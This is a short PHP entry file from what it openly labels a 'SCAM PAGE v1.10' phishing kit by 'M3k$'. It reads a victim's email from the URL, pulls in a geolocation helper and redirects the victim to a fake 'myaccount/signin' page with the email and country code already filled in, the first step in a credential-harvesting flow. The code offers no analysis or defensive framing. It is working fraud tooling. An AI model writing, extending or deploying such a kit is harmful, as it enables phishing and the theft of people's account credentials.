<?php
/*   
   _____   _                   _                       
  / ____| | |                 | |                      
 | (___   | |__     __ _    __| |   ___   __      __   
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /   
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /   
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     
                                                                                
                              #=======================#
                              #   SCAM PAGE v1.10     #
                              #        M3k$           #
                              #=======================#
                   
*/


session_start();
error_reporting(0);
$email = $_GET['email'];
include('./functions/get_ip.php');

header("LOCATION: myaccount/signin/?email=$email&country.x=".$_SESSION['_LOOKUP_CNTRCODE_']."&locale.x=en_".$_SESSION['_LOOKUP_CNTRCODE_']."");
?>
